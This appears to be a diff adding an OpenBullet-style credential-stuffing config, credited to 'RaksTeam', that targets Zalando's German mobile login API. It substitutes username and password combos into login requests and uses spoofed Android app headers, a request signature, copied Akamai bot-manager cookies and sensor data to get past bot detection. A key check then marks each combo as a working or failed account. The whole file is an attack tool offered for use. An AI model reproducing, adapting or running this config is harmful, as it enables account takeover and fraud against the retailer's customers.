@@ -1,0 +1,91 @@
+[SETTINGS]
+{
+  "Name": "Zalando.De [RaksTeam]",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2021-06-04T11:42:49.6877784+02:00",
+  "AdditionalInfo": "",
+  "Author": "RaksTeam",
+  "Version": "1.4.3 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+BEGIN SCRIPT 
+JavaScript var TIME = new Date().getTime(); 
+END SCRIPT -> VARS "TIME
+
+REQUEST POST "https://en.zalando.de/api/mobile/v3/user/login.json" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\",\"appVersion\":\"5.6.2\",\"appdomainId\":1,\"deviceLanguage\":\"en\",\"devicePlatform\":\"android\",\"sig\":\"6b45b20e8e9fac424cade9931ca3ae3e4389e32e\",\"ts\":<TIME>,\"uuid\":\"84b55a0a-1177-41b5-a850-3964fc61b684\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Host: en.zalando.de" 
+  HEADER "Cookie: Zalando-Client-Id=cdb618c7-889c-496f-a88c-ac2e88156241; bm_sz=F9F23E9AAC401F5BCFE37EEB48077ECD~YAAQmmZWuNHWrtJ5AQAAMzBY1gzKXnD3azwA85gVyOPb7upRqzmYZFCURYvZe7VJ6JTpbHwUtfslkTBir6DvzC86vhcYC+fsyOsst6V4swMyPT9iI1HjZrRSbyko8iWhXkh5dMdECLefs+z/B6XPuaQMydBiztMZbW88VvAyHXhVOehomZiYuIzbdJsCPTGuzAeHR3IkZdHlFO06Xt1snhYrGDtzHBLUkvYsbxggsIDhYLncoL9adyo+3Bybj9GxW4q3UBmuB2sm2pfe8A==; _abck=C2E8012786A2117BBB243B6BE9E16D58~-1~YAAQmmZWuNLWrtJ5AQAAMzBY1ga9//zU2BALJhbtG2Po9Pib7P0aDhPi2N74pCF9GSMKAeTHFDdHmJ7MsCVaIgMHdF05khpPg52Aw5Sbj45o1RwELgOAoiCQpcn6vH6a6tV3CFMpGemnkdTsIk63HfmTXzuRGrREihtoLSTdYijCoZHocL1u5WKm5Xf829Af9t/eVkUfWzO9d+4wKD1uIOHCbAg3kO+IwcmEMZrri4VIzNaLlPYkezIi7K40pO7o4vs/wfarTprQeno3R+G1yxQR+Z4EkU12+CWxiSWC2UUgvtGl7mSwlMdJ/Mt+R/oVPqQ4mUlDg2+rDGglzDIu6Hff4py1jTg1N7KBq22niq0QuxLacODS5szb~-1~-1~-1; xzma=true; bm_sv=B0F7E17048C2E1BD2EC26722141006CF~8KoKAXBPhyB7ZFMkLUtN9l3BF2CF8cQWmg80X/S4xyRkdMfo03X5HgpI10RZDRbnkQX7ZEPgz+KVxhUdd8OvkRmE6a2PTu/ek6eDijhrQw6zfBJdQ0tL4detFtXERUuDQma7otgX4C42rLP9QEQO8BcvUaOC+VG00oNsa30FSDs=; ak_bmsc=C2FA76E9DF86EF2D2F08B9175C70BAC8~000000000000000000000000000000~YAAQmWZWuHL3G9J5AQAAfUJb1gzeFtJ3bm3GRtCSQfOWOgGrTmmcx0SXn9xGLxA5B3ArHxYzsJEvWNMFxtFW9YcOOUzMMh1a3j+O/TGu8P0Gug8m0zEbUxD6mmynmPtBaMQuJKZ0pMA6ulCT43//fEu10PLPL28oKGV63njtKX38uM48cCUjQZOv7agx5MfQi/D9w3i7mjfqwU5oHtFilqtruf9epmSg5CL2EWfQomnsFydKs4DjZjSNSaUCbRtB3HZju4bgdFZ1yqKdYNULzLDU3XS+m9Wei26Y1d7VVDOzDuRkhl3P40SVXI1cl0x+S3rH3WWBhaldOSfTTunAqpT3RyY6nd8pwFPrwtSn8ovaj2dHl7Jsk0DeLHJ7kBEctehJLQRRgUOCK55k" 
+  HEADER "Cache-Control: private, no-cache, no-store" 
+  HEADER "X-App-Domain: 1" 
+  HEADER "User-Agent: Zalando/5.6.2 (Linux; Android 5.1.1; Samsung SM-G930K/dream2ltexx-user 5.1.1 NRD90M 500210421 release-keys)" 
+  HEADER "X-App-Version: 5.6.2" 
+  HEADER "X-Uuid: 84b55a0a-1177-41b5-a850-3964fc61b684" 
+  HEADER "X-Ts: 1622798856978" 
+  HEADER "X-Device-Os: android" 
+  HEADER "X-Device-Platform: android" 
+  HEADER "X-Device-Language: en" 
+  HEADER "X-Sig: 6b45b20e8e9fac424cade9931ca3ae3e4389e32e" 
+  HEADER "X-Os-Version: 5.1.1" 
+  HEADER "Accept-Language: en-GB" 
+  HEADER "Accept: application/json" 
+  HEADER "X-Zalando-Mobile-App: 1166c0792788b3f3a" 
+  HEADER "X-Logged-In: false" 
+  HEADER "X-Advertising-Id: 108646d8-7c37-49eb-96d5-6064f42a89cc" 
+  HEADER "Content-Type: application/json; charset=UTF-8" 
+  HEADER "Content-Length: 249" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "X-Acf-Sensor-Data: 2,a,pzXmfxa3OPHC8F4EhvnRcOp2EjPRZ6cNq7yg2+OtBqQFPbwxav9ui3Pb1pCebqsm0Olt+vSCkOO9440w0URTEs0gLzPAYTAm0XODZ7U3GrGB5zpCp+RgUdgtXpybicRPpUsWZJHUYDNKpQiDJKq6sOwqCYFOrcPgFhjPsvb/0Ic=,T6BYwWjEo/4N8PrYD8WjVsr1KQtCTgv7UQQYszoV/lz6Gbw6h6xwUWpUOk0ERQ03uOR4Rth31Wq3BjinTGYlpbRE00ao8PMOkJvIf0KDceyfgwQKVzTml5fkhZKEaQTOFOeuto3uWbGFPgsnRtiifBJcVx1XENY60w1DZvSkQKw=$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$82000,31000,0$$" 
+  HEADER "Ot-Tracer-Traceid: f69ed8493d08d1c" 
+  HEADER "Ot-Tracer-Spanid: 1a1e8f31a54bb398" 
+  HEADER "Ot-Tracer-Sampled: true" 
+  HEADER "Connection: close" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "successful\":false" 
+  KEYCHAIN Success OR 
+    KEY "successful\":true" 
+
